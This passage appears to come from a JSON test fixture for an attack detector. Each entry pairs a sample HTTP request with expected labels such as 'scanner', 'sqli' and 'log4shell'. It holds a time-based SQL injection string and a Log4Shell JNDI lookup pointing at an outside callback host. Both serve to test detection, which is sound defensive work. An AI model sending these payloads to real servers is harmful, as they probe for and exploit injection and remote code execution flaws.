  {
    "id": "mixed-sqlmap-injecting",
    "request": {"query": "id=1' AND SLEEP(5)-- -", "headers": [["User-Agent", "sqlmap/1.7.11#stable (https://sqlmap.org)"]]},
    "expect": ["scanner", "sqli"]
  },
  {
    "id": "mixed-nuclei-log4shell",
    "request": {
      "path": "/",
      "headers": [
        ["User-Agent", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"],
        ["X-Api-Version", "${jndi:ldap://abc.oast.fun/a}"]
      ]
    },
    "expect": ["scanner", "log4shell", "cmdi"]
  },

